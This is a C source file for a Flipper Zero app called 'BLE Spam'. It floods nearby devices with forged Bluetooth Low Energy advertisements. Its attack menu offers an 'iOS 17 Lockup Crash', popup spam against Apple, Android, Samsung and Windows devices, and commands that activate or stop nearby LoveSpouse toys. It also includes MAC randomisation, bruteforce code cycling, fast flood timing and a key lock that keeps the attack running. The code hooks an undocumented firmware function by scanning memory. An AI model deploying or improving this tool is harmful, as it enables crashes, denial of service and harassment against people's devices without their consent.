#include "ble_spam.h"
#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <stdint.h>
#include <furi_hal_random.h>
#include "protocols/_protocols.h"

#include <notification/notification.h>
#include <notification/notification_messages.h>

// NAPI
// TODO: Use __attribute__((aligned(2))) instead?
// TODO: Use an offset of the base address?

#define TAG "FuriHalBt"
#define BLE_STATUS_TIMEOUT 0xFFU
#define BLE_CMD_MAX_PARAM_LEN 255

typedef uint8_t tBleStatus;

typedef __PACKED_STRUCT {
    uint8_t Adv_Data_Length;
    uint8_t Adv_Data[BLE_CMD_MAX_PARAM_LEN - 1];
}
aci_gap_additional_beacon_set_data_cp0;

typedef __PACKED_STRUCT {
    uint16_t Adv_Interval_Min;
    uint16_t Adv_Interval_Max;
    uint8_t Adv_Channel_Map;
    uint8_t Own_Address_Type;
    uint8_t Own_Address[6];
    uint8_t PA_Level;
}
aci_gap_additional_beacon_start_cp0;

struct hci_request {
    uint16_t ogf;
    uint16_t ocf;
    int event;
    void* cparam;
    int clen;
    void* rparam;
    int rlen;
};

#define HCI_SEND_REQ_ADDR 0x080161e8
#define TARGET_SEQUENCE 0x33680446
#define SEQUENCE_OFFSET 6
#define START_ADDR 0x8000140
#define END_ADDR 0x80800ec

uintptr_t* scan_memory_for_sequence(uint32_t sequence) {
    uint8_t* addr;
    uint8_t* target_bytes = (uint8_t*)&sequence;

    for(addr = (uint8_t*)START_ADDR; addr < (uint8_t*)END_ADDR - 3; addr++) {
        if(addr[0] == target_bytes[3] && addr[1] == target_bytes[2] &&
           addr[2] == target_bytes[1] && addr[3] == target_bytes[0]) {
            return (uintptr_t*)(addr - SEQUENCE_OFFSET);
        }
    }
    return (uintptr_t*)HCI_SEND_REQ_ADDR; // If not found, default to latest OFW offset
}

int (*napi_hci_send_req)(struct hci_request* p_cmd, uint8_t async) = NULL;

void* Osal_MemCpy(void* dest, const void* src, unsigned int size) {
    return memcpy(dest, src, size);
}

void* Osal_MemSet(void* ptr, int value, unsigned int size) {
    return memset(ptr, value, size);
}

tBleStatus aci_gap_additional_beacon_start(
    uint16_t Adv_Interval_Min,
    uint16_t Adv_Interval_Max,
    uint8_t Adv_Channel_Map,
    uint8_t Own_Address_Type,
    const uint8_t* Own_Address,
    uint8_t PA_Level) {
    struct hci_request rq;
    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
    aci_gap_additional_beacon_start_cp0* cp0 = (aci_gap_additional_beacon_start_cp0*)(cmd_buffer);
    tBleStatus status = 0;
    int index_input = 0;
    cp0->Adv_Interval_Min = Adv_Interval_Min;
    index_input += 2;
    cp0->Adv_Interval_Max = Adv_Interval_Max;
    index_input += 2;
    cp0->Adv_Channel_Map = Adv_Channel_Map;
    index_input += 1;
    cp0->Own_Address_Type = Own_Address_Type;
    index_input += 1;
    Osal_MemCpy((void*)&cp0->Own_Address, (const void*)Own_Address, 6);
    index_input += 6;
    cp0->PA_Level = PA_Level;
    index_input += 1;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b0;
    rq.cparam = cmd_buffer;
    rq.clen = index_input;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

tBleStatus aci_gap_additional_beacon_stop(void) {
    struct hci_request rq;
    tBleStatus status = 0;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b1;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

tBleStatus aci_gap_additional_beacon_set_data(uint8_t Adv_Data_Length, const uint8_t* Adv_Data) {
    struct hci_request rq;
    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
    aci_gap_additional_beacon_set_data_cp0* cp0 =
        (aci_gap_additional_beacon_set_data_cp0*)(cmd_buffer);
    tBleStatus status = 0;
    int index_input = 0;
    cp0->Adv_Data_Length = Adv_Data_Length;
    index_input += 1;
    Osal_MemCpy((void*)&cp0->Adv_Data, (const void*)Adv_Data, Adv_Data_Length);
    index_input += Adv_Data_Length;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b2;
    rq.cparam = cmd_buffer;
    rq.clen = index_input;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

bool napi_furi_hal_bt_custom_adv_set(const uint8_t* adv_data, size_t adv_len) {
    tBleStatus status = aci_gap_additional_beacon_set_data(adv_len, adv_data);
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_set failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_set success");
        return true;
    }
}

bool napi_furi_hal_bt_custom_adv_start(
    uint16_t min_interval,
    uint16_t max_interval,
    uint8_t mac_type,
    const uint8_t mac_addr[GAP_MAC_ADDR_SIZE],
    uint8_t power_amp_level) {
    tBleStatus status = aci_gap_additional_beacon_start(
        (double)(min_interval / 0.625), // Millis to gap time
        (double)(max_interval / 0.625), // Millis to gap time
        0b00000111, // All 3 channels
        mac_type,
        mac_addr,
        power_amp_level);
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_start failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_start success");
        return true;
    }
}

bool napi_furi_hal_bt_custom_adv_stop() {
    tBleStatus status = aci_gap_additional_beacon_stop();
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_stop failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_stop success");
        return true;
    }
}

// Hacked together by @Willy-JL
// Custom adv API by @Willy-JL (idea by @xMasterX)
// iOS 17 Crash by @ECTO-1A
// Android, Samsung and Windows Pairs by @Spooks4576 and @ECTO-1A
// Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576
// Controversy explained at https://willyjl.dev/blog/the-controversy-behind-apple-ble-spam

static Attack attacks[] = {
    {
        .title = "The Kitchen Sink",
        .text = "Flood all attacks at once",
        .protocol = NULL,
        .payload =
            {
                .random_mac = true,
                .cfg = {},
            },
    },
    {
        .title = "iOS 17 Lockup Crash",
        .text = "Newer iPhones, long range",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg.continuity =
                    {
                        .type = ContinuityTypeCustomCrash,
                    },
            },
    },
    {
        .title = "Apple Action Modal",
        .text = "Lock cooldown, long range",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg.continuity =
                    {
                        .type = ContinuityTypeNearbyAction,
                    },
            },
    },
    {
        .title = "Apple Device Popup",
        .text = "No cooldown, close range",
        .protocol = &protocol_continuity,
        .payload =
            {
                .random_mac = false,
                .cfg.continuity =
                    {
                        .type = ContinuityTypeProximityPair,
                    },
            },
    },
    {
        .title = "Android Device Connect",
        .text = "Reboot cooldown, long range",
        .protocol = &protocol_fastpair,
        .payload =
            {
                .random_mac = true,
                .cfg.fastpair = {},
            },
    },
    {
        .title = "Samsung Buds Popup",
        .text = "No cooldown, long range",
        .protocol = &protocol_easysetup,
        .payload =
            {
                .random_mac = true,
                .cfg.easysetup =
                    {
                        .type = EasysetupTypeBuds,
                    },
            },
    },
    {
        .title = "Samsung Watch Pair",
        .text = "No cooldown, long range",
        .protocol = &protocol_easysetup,
        .payload =
            {
                .random_mac = true,
                .cfg.easysetup =
                    {
                        .type = EasysetupTypeWatch,
                    },
            },
    },
    {
        .title = "Windows Device Found",
        .text = "No cooldown, short range",
        .protocol = &protocol_swiftpair,
        .payload =
            {
                .random_mac = true,
                .cfg.swiftpair = {},
            },
    },
    {
        .title = "Vibrate 'em All",
        .text = "Activate all LoveSpouse toys",
        .protocol = &protocol_lovespouse,
        .payload =
            {
                .random_mac = true,
                .cfg.lovespouse =
                    {
                        .state = LovespouseStatePlay,
                    },
            },
    },
    {
        .title = "Denial of Pleasure",
        .text = "Disable all LoveSpouse toys",
        .protocol = &protocol_lovespouse,
        .payload =
            {
                .random_mac = true,
                .cfg.lovespouse =
                    {
                        .state = LovespouseStateStop,
                    },
            },
    },
};

#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))

static uint16_t delays[] = {20, 50, 100, 200};

typedef struct {
    Ctx ctx;
    View* main_view;
    bool lock_warning;
    uint8_t lock_count;
    FuriTimer* lock_timer;

    bool resume;
    bool advertising;
    uint8_t delay;
    FuriThread* thread;
    int8_t index;
    bool ignore_bruteforce;
} State;

const NotificationSequence solid_message = {
    &message_red_0,
    &message_green_255,
    &message_blue_255,
    &message_do_not_reset,
    &message_delay_10,
    NULL,
};
NotificationMessage blink_message = {
    .type = NotificationMessageTypeLedBlinkStart,
    .data.led_blink.color = LightBlue | LightGreen,
    .data.led_blink.on_time = 10,
    .data.led_blink.period = 100,
};
const NotificationSequence blink_sequence = {
    &blink_message,
    &message_do_not_reset,
    NULL,
};
static void start_blink(State* state) {
    uint16_t period = delays[state->delay];
    if(period <= 100) period += 30;
    blink_message.data.led_blink.period = period;
    notification_message_block(state->ctx.notification, &blink_sequence);
}
static void stop_blink(State* state) {
    notification_message_block(state->ctx.notification, &sequence_blink_stop);
}

static int32_t adv_thread(void* _ctx) {
    State* state = _ctx;
    uint8_t size;
    uint16_t delay;
    uint8_t* packet;
    uint8_t mac[GAP_MAC_ADDR_SIZE];
    Payload* payload = &attacks[state->index].payload;
    const Protocol* protocol = attacks[state->index].protocol;
    if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
    if(state->ctx.led_indicator) start_blink(state);

    while(state->advertising) {
        if(protocol) {
            if(payload->mode == PayloadModeBruteforce && payload->bruteforce.counter++ >= 10) {
                payload->bruteforce.counter = 0;
                payload->bruteforce.value =
                    (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
            }
            protocol->make_packet(&size, &packet, payload);
        } else {
            protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
        }
        napi_furi_hal_bt_custom_adv_set(packet, size);
        free(packet);

        if(payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
        delay = delays[state->delay];
        napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
        furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
        napi_furi_hal_bt_custom_adv_stop();
    }

    if(state->ctx.led_indicator) stop_blink(state);
    return 0;
}

static void toggle_adv(State* state) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
        furi_thread_join(state->thread);
        if(state->resume) furi_hal_bt_start_advertising();
    } else {
        state->advertising = true;
        state->resume = furi_hal_bt_is_active();
        furi_hal_bt_stop_advertising();
        furi_thread_start(state->thread);
    }
}

#define PAGE_MIN (-5)
#define PAGE_MAX ATTACKS_COUNT
enum {
    PageHelpBruteforce = PAGE_MIN,
    PageHelpApps,
    PageHelpDelay,
    PageHelpDistance,
    PageHelpInfoConfig,
    PageStart = 0,
    PageEnd = ATTACKS_COUNT - 1,
    PageAboutCredits = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* _ctx) {
    State* state = *(State**)_ctx;
    const char* back = "Back";
    const char* next = "Next";
    if(state->index < 0) {
        back = "Next";
        next = "Back";
    }
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    const Attack* attack =
        (state->index >= 0 && state->index <= ATTACKS_COUNT - 1) ? &attacks[state->index] : NULL;
    const Payload* payload = attack ? &attack->payload : NULL;
    const Protocol* protocol = attack ? attack->protocol : NULL;

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 4 - !protocol, 3, protocol ? protocol->icon : &I_ble_spam);
    canvas_draw_str(canvas, 14, 12, "BLE Spam");

    switch(state->index) {
    case PageHelpBruteforce:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Bruteforce\e# cycles codes\n"
            "to find popups, hold left and\n"
            "right to send manually and\n"
            "change delay",
            false);
        break;
    case PageHelpApps:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageHelpDelay:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageHelpDistance:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# varies greatly:\n"
            "some are long range (>30 m)\n"
            "others are close range (<1 m)",
            false);
        break;
    case PageHelpInfoConfig:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "See \e#more info\e# and change\n"
            "\e#attack options\e# by holding\n"
            "Ok on each attack page",
            false);
        break;
    case PageAboutCredits:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Credits");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+Spam: \e#WillyJL\e# XFW\n"
            "Apple+Crash: \e#ECTO-1A\e#\n"
            "Android+Win: \e#Spooks4576\e#\n"
            "                                   Version \e#4.2\e#",
            false);
        break;
    default: {
        if(!attack) break;
        if(state->ctx.lock_keyboard && !state->advertising) {
            // Forgive me Lord for I have sinned by handling state in draw
            toggle_adv(state);
        }
        char str[32];

        canvas_set_font(canvas, FontPrimary);
        if(payload->mode == PayloadModeBruteforce) {
            snprintf(
                str,
                sizeof(str),
                "0x%0*lX",
                payload->bruteforce.size * 2,
                payload->bruteforce.value);
        } else {
            snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        }
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
        canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);

        canvas_set_font(canvas, FontPrimary);
        if(payload->mode == PayloadModeBruteforce) {
            canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignBottom, "Bruteforce");
            if(delays[state->delay] < 100) {
                snprintf(str, sizeof(str), "%ims>", delays[state->delay]);
            } else {
                snprintf(str, sizeof(str), "%.1fs>", (double)delays[state->delay] / 1000);
            }
            uint16_t w = canvas_string_width(canvas, str);
            elements_slightly_rounded_box(canvas, 3, 14, 30, 10);
            elements_slightly_rounded_box(canvas, 119 - w, 14, 6 + w, 10);
            canvas_invert_color(canvas);
            canvas_draw_str_aligned(canvas, 5, 22, AlignLeft, AlignBottom, "<Send");
            canvas_draw_str_aligned(canvas, 122, 22, AlignRight, AlignBottom, str);
            canvas_invert_color(canvas);
        } else {
            snprintf(
                str,
                sizeof(str),
                "%02i/%02i: %s",
                state->index + 1,
                ATTACKS_COUNT,
                protocol ? protocol->get_name(payload) : "Everything AND");
            canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);
        }

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 35, attack->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, attack->text);

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }

    if(state->lock_warning) {
        canvas_set_font(canvas, FontSecondary);
        elements_bold_rounded_frame(canvas, 14, 8, 99, 48);
        elements_multiline_text(canvas, 65, 26, "To unlock\npress:");
        canvas_draw_icon(canvas, 65, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 80, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 95, 42, &I_Pin_back_arrow_10x8);
        canvas_draw_icon(canvas, 16, 13, &I_WarningDolphin_45x42);
        canvas_draw_dot(canvas, 17, 61);
    }
}

static bool input_callback(InputEvent* input, void* _ctx) {
    View* view = _ctx;
    State* state = *(State**)view_get_model(view);
    bool consumed = false;

    if(state->ctx.lock_keyboard) {
        consumed = true;
        with_view_model(
            state->main_view, State * *model, { (*model)->lock_warning = true; }, true);
        if(state->lock_count == 0) {
            furi_timer_start(state->lock_timer, 1000);
        }
        if(input->type == InputTypeShort && input->key == InputKeyBack) {
            state->lock_count++;
        }
        if(state->lock_count >= 3) {
            furi_timer_start(state->lock_timer, 1);
        }
    } else if(
        input->type == InputTypeShort || input->type == InputTypeLong ||
        input->type == InputTypeRepeat) {
        consumed = true;

        bool is_attack = state->index >= 0 && state->index <= ATTACKS_COUNT - 1;
        Payload* payload = is_attack ? &attacks[state->index].payload : NULL;
        bool advertising = state->advertising;

        switch(input->key) {
        case InputKeyOk:
            if(is_attack) {
                if(input->type == InputTypeLong) {
                    if(advertising) toggle_adv(state);
                    state->ctx.attack = &attacks[state->index];
                    scene_manager_set_scene_state(state->ctx.scene_manager, SceneConfig, 0);
                    scene_manager_next_scene(state->ctx.scene_manager, SceneConfig);
                } else if(input->type == InputTypeShort) {
                    toggle_adv(state);
                }
            }
            break;
        case InputKeyUp:
            if(is_attack) {
                if(payload->mode == PayloadModeBruteforce) {
                    payload->bruteforce.counter = 0;
                    payload->bruteforce.value =
                        (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
                } else if(state->delay < COUNT_OF(delays) - 1) {
                    state->delay++;
                    if(advertising) start_blink(state);
                }
            }
            break;
        case InputKeyDown:
            if(is_attack) {
                if(payload->mode == PayloadModeBruteforce) {
                    payload->bruteforce.counter = 0;
                    payload->bruteforce.value =
                        (payload->bruteforce.value - 1) % (1 << (payload->bruteforce.size * 8));
                } else if(state->delay > 0) {
                    state->delay--;
                    if(advertising) start_blink(state);
                }
            }
            break;
        case InputKeyLeft:
            if(input->type == InputTypeLong) {
                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
                                                     true;
            }
            if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
               payload->mode != PayloadModeBruteforce) {
                if(state->index > PAGE_MIN) {
                    if(advertising) toggle_adv(state);
                    state->index--;
                }
            } else {
                if(!advertising) {
                    bool resume = furi_hal_bt_is_active();
                    furi_hal_bt_stop_advertising();
                    Payload* payload = &attacks[state->index].payload;
                    const Protocol* protocol = attacks[state->index].protocol;

                    uint8_t size;
                    uint8_t* packet;
                    protocol->make_packet(&size, &packet, payload);
                    napi_furi_hal_bt_custom_adv_set(packet, size);
                    free(packet);

                    uint8_t mac[GAP_MAC_ADDR_SIZE];
                    furi_hal_random_fill_buf(mac, sizeof(mac));
                    uint16_t delay = delays[state->delay];
                    napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
                    if(state->ctx.led_indicator)
                        notification_message(state->ctx.notification, &solid_message);
                    furi_delay_ms(10);
                    napi_furi_hal_bt_custom_adv_stop();

                    if(state->ctx.led_indicator)
                        notification_message_block(state->ctx.notification, &sequence_reset_rgb);
                    if(resume) furi_hal_bt_start_advertising();
                }
            }
            break;
        case InputKeyRight:
            if(input->type == InputTypeLong) {
                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
                                                     true;
            }
            if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
               payload->mode != PayloadModeBruteforce) {
                if(state->index < PAGE_MAX) {
                    if(advertising) toggle_adv(state);
                    state->index++;
                }
            } else if(input->type == InputTypeLong) {
                state->delay = (state->delay + 1) % COUNT_OF(delays);
                if(advertising) start_blink(state);
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state);
            consumed = false;
            break;
        default:
            break;
        }
    }

    view_commit_model(view, consumed);
    return consumed;
}

static void lock_timer_callback(void* _ctx) {
    State* state = _ctx;
    if(state->lock_count < 3) {
        notification_message_block(state->ctx.notification, &sequence_display_backlight_off);
    } else {
        state->ctx.lock_keyboard = false;
    }
    with_view_model(
        state->main_view, State * *model, { (*model)->lock_warning = false; }, true);
    state->lock_count = 0;
}

static void tick_event_callback(void* _ctx) {
    State* state = _ctx;
    bool advertising;
    with_view_model(
        state->main_view, State * *model, { advertising = (*model)->advertising; }, advertising);
    scene_manager_handle_tick_event(state->ctx.scene_manager);
}

static bool back_event_callback(void* _ctx) {
    State* state = _ctx;
    return scene_manager_handle_back_event(state->ctx.scene_manager);
}

int32_t ble_spam(void* p) {
    UNUSED(p);
    napi_hci_send_req = (int (*)(struct hci_request*, uint8_t))(
        (uintptr_t)(scan_memory_for_sequence(TARGET_SEQUENCE)) | 0x01);
    State* state = malloc(sizeof(State));
    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 4096);
    state->ctx.led_indicator = true;
    state->lock_timer = furi_timer_alloc(lock_timer_callback, FuriTimerTypeOnce, state);

    state->ctx.notification = furi_record_open(RECORD_NOTIFICATION);
    Gui* gui = furi_record_open(RECORD_GUI);
    state->ctx.view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(state->ctx.view_dispatcher);
    view_dispatcher_set_event_callback_context(state->ctx.view_dispatcher, state);
    view_dispatcher_set_tick_event_callback(state->ctx.view_dispatcher, tick_event_callback, 100);
    view_dispatcher_set_navigation_event_callback(state->ctx.view_dispatcher, back_event_callback);
    state->ctx.scene_manager = scene_manager_alloc(&scene_handlers, &state->ctx);

    state->main_view = view_alloc();
    view_allocate_model(state->main_view, ViewModelTypeLocking, sizeof(State*));
    with_view_model(
        state->main_view, State * *model, { *model = state; }, false);
    view_set_context(state->main_view, state->main_view);
    view_set_draw_callback(state->main_view, draw_callback);
    view_set_input_callback(state->main_view, input_callback);
    view_dispatcher_add_view(state->ctx.view_dispatcher, ViewMain, state->main_view);

    state->ctx.byte_input = byte_input_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewByteInput, byte_input_get_view(state->ctx.byte_input));

    state->ctx.submenu = submenu_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewSubmenu, submenu_get_view(state->ctx.submenu));

    state->ctx.text_input = text_input_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher, ViewTextInput, text_input_get_view(state->ctx.text_input));

    state->ctx.variable_item_list = variable_item_list_alloc();
    view_dispatcher_add_view(
        state->ctx.view_dispatcher,
        ViewVariableItemList,
        variable_item_list_get_view(state->ctx.variable_item_list));

    view_dispatcher_attach_to_gui(state->ctx.view_dispatcher, gui, ViewDispatcherTypeFullscreen);
    scene_manager_next_scene(state->ctx.scene_manager, SceneMain);
    view_dispatcher_run(state->ctx.view_dispatcher);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewByteInput);
    byte_input_free(state->ctx.byte_input);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewSubmenu);
    submenu_free(state->ctx.submenu);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewTextInput);
    text_input_free(state->ctx.text_input);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewVariableItemList);
    variable_item_list_free(state->ctx.variable_item_list);

    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewMain);
    view_free(state->main_view);

    scene_manager_free(state->ctx.scene_manager);
    view_dispatcher_free(state->ctx.view_dispatcher);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);

    furi_timer_free(state->lock_timer);
    furi_thread_free(state->thread);
    free(state);
    return 0;
}
